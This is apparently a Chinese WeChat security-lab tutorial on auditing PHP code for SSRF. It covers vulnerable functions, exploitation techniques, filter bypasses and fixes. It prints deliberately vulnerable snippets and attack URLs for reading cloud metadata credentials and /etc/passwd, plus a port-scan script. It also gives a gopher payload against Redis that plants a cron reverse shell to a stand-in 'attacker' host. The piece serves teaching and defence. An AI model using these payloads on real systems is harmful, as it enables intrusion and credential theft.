---
title: [代码审计] php SSRF
url: https://mp.weixin.qq.com/s/-1uJNEYNIClUoBRlSYnbwQ
source: Doonsec's feed
date: 2026-05-25
fetch_date: 2026-05-26T06:06:18.391250
---

# [代码审计] php SSRF

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/BasqgWRklkQTlnDOnPnZdTx7leAd3V23mtrzLuwfTTEwicsx6hPkq1vsTLZSKM1j9Xy26ic2DgibasobrvrXPSWSxR1t46ibxblaLa8gKYZEfuU/0?wx_fmt=jpeg)

# [代码审计] php SSRF

原创

Pik安全实验室
Pik安全实验室

Pik安全实验室

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

0x00 介绍

SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者通过控制服务端发起的网络请求，使其访问内部网络资源或外部服务。在 PHP 中，SSRF 通常发生在程序使用用户可控的 URL 参数去请求资源时，如 curl、file\_get\_contents、fsockopen 等函数。SSRF 的核心危害在于：攻击者可以绕过防火墙访问内部系统，读取云元数据，探测内网端口，甚至结合其他漏洞实现 RCE。

0x01 产生 SSRF 的函数

curl\_exec()

curl 是最常见的 SSRF 触发点。它支持丰富的协议（HTTP、HTTPS、FTP、Gopher、Dict、File 等），攻击面最大。

// curl\_exec() 示例
$url = $\_GET['url'];
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $url);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, 1);
$output = curl\_exec($ch);
curl\_close($ch);
echo $output;

// 攻击: ?url=http://169.254.169.254/latest/meta-data/
// 攻击: ?url=file:///etc/passwd
// 攻击: ?url=gopher://127.0.0.1:6379/\_\*1%0d%0a$8%0d%0aflushall...

file\_get\_contents()

file\_get\_contents 支持 HTTP 和 FTP 协议，如果 allow\_url\_fopen 开启（默认开启），可直接用于 SSRF。

// file\_get\_contents() 示例
$url = $\_GET['url'];
$content = file\_get\_contents($url);
echo $content;

// 攻击: ?url=http://169.254.169.254/latest/meta-data/
// 攻击: ?url=http://127.0.0.1:8080/admin

fsockopen()

fsockopen 可以建立任意 TCP 连接，适合构造原始 HTTP 请求和利用 Gopher/Dict 等协议的内网服务。

// fsockopen() 示例
$host = $\_GET['host'];
$port = $\_GET['port'];
$fp = fsockopen($host, $port, $errno, $errstr, 30);
if (!$fp) {
    echo "$errstr ($errno)";
} else {
    fwrite($fp, "GET / HTTP/1.0\r\nHost: $host\r\n\r\n");
    while (!feof($fp)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}
// 攻击: ?host=127.0.0.1&port=6379  — Redis 探测
// 攻击: ?host=10.0.0.1&port=22      — 内网端口扫描

fopen() + stream\_context\_create()

fopen 配合流上下文可以发起 HTTP 请求。支持更多自定义选项，同样可以触发 SSRF。

readfile() / get\_headers() / getimagesize()

这些函数也接受 URL 参数并发起网络请求，容易被忽略但同样存在 SSRF 风险。

SimpleXML/DOMDocument load 方法

XML 解析器在加载外部实体时会发起请求，利用 XXE 可配合 SSRF 攻击。

// XML 解析触发 SSRF
$xml = $\_POST['xml'];
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML\_NOENT | LIBXML\_DTDLOAD);

// 攻击 payload
// //
// ]>
//&xxe;

0x02 利用手法

内网端口探测

利用响应时间和内容差异判断端口开放状态，扫描内网存活主机和服务。

# 端口扫描脚本
import requests
for port in [22, 80, 443, 3306, 6379, 8080, 9200]:
    try:
        r = requests.get(f'http://target/ssrf.php?url=http://127.0.0.1:{port}', timeout=2)
        print(f"Port {port}: OPEN (len={len(r.text)})")
    except:
        print(f"Port {port}: CLOSED/TIMEOUT")

读取云元数据

云服务器厂商提供了本地元数据 API，通常监听在 169.254.169.254。这是 SSRF 最高价值的利用场景之一，可直接获取 AccessKey 等敏感凭证。

# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 阿里云
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/

# 腾讯云
http://metadata.tencentyun.com/latest/meta-data/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/

Gopher 协议攻击内网服务

Gopher 协议是 SSRF 中利用价值最高的协议，可以构造任意 TCP 数据包，直接攻击 Redis、MySQL、FastCGI 等内网服务。curl 默认支持 gopher 协议。

# Gopher 攻击 Redis（写入 crontab 反弹 shell）
gopher://127.0.0.1:6379/\_\*1%0d%0a$8%0d%0aflushall%0d%0a\*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a\*/1 \* \* \* \* bash -i >& /dev/tcp/attacker/4444 0>&1%0a%0a%0d%0a\*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a\*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a\*1%0d%0a$4%0d%0asave%0d%0a

# Gopher 攻击 MySQL
# Gopher 攻击 FastCGI
# Gopher 攻击 Memcached

Dict 协议端口探测

Dict 协议可用于探测端口和获取服务 banner 信息。

dict://127.0.0.1:6379/info    # Redis 信息泄露
dict://127.0.0.1:3306/        # MySQL 探测
dict://127.0.0.1:22/          # SSH banner

0x03 绕过技巧

IP 限制绕过

许多程序会过滤 127.0.0.1、localhost、内网 IP 等。但存在多种绕过方式：

# 1. 短地址绕过
http://0/           # 指向 0.0.0.0
http://127.1/       # 指向 127.0.0.1
http://2130706433/  # 十进制 IP
http://0x7f000001/  # 十六进制 IP
http://0177.0.0.1/ # 八进制 IP

# 2. DNS 重绑定
# 域名第一次解析为合法 IP，第二次解析为 127.0.0.1
http://xxx.1u.ms/   # DNS Rebinding 服务

# 3. 302 跳转
# 先让服务端访问一个合法 URL，返回 302 跳转到内网地址

# 4. IPv6
http://[::1]:8080/
http://[::ffff:127.0.0.1]/

# 5. 特殊域名
http://localtest.me/       # 解析到 127.0.0.1
http://spoofed.burpcollaborator.net/

协议限制绕过

如果程序限制只能用 http/https，可以尝试 URL 解析差异绕过。

# URL 解析差异
http://127.0.0.1:6379/     # curl 解析为 HTTP 去 6379 端口
# 或利用 CRLF 注入
http://target/#@127.0.0.1:6379/

# 利用 PHP 的 parse\_url 与 curl 的解析差异
# parse\_url 认为是 host，curl 认为是 creds
http://google.com@evil.com/

0x04 修复方案

1. 白名单限制

只允许访问预先定义好的域名和 IP 列表，拒绝其他所有请求。

2. 禁用危险协议

curl 中禁用 Gopher、Dict、File 等危险协议，只保留 HTTP/HTTPS。

curl\_setopt($ch, CURLOPT\_PROTOCOLS, CURLPROTO\_HTTP | CURLPROTO\_HTTPS);
curl\_setopt($ch, CURLOPT\_REDIR\_PROTOCOLS, CURLPROTO\_HTTP | CURLPROTO\_HTTPS);

3. 内网 IP 黑名单

过滤目标 IP，禁止访问内网地址段。但黑名单易被绕过，建议配合白名单使用。

4. 网络隔离

将 Web 服务器放在独立的网络区域，通过防火墙限制其访问内网资源。这是纵深防御中最有效的一层。

本文仅作安全研究与学习用途，用于非法行为后果自行承担。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/RBwZuZBV3fSt1n0yS8EEGgiaDF2WgPfMeiaGOMly1wWQQUlwiclwJDFJAZFGmeSroT0oLpGETAeKwiaPBeY1whYoOA/0?wx_fmt=png)

Pik安全实验室

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/RBwZuZBV3fSt1n0yS8EEGgiaDF2WgPfMeiaGOMly1wWQQUlwiclwJDFJAZFGmeSroT0oLpGETAeKwiaPBeY1whYoOA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过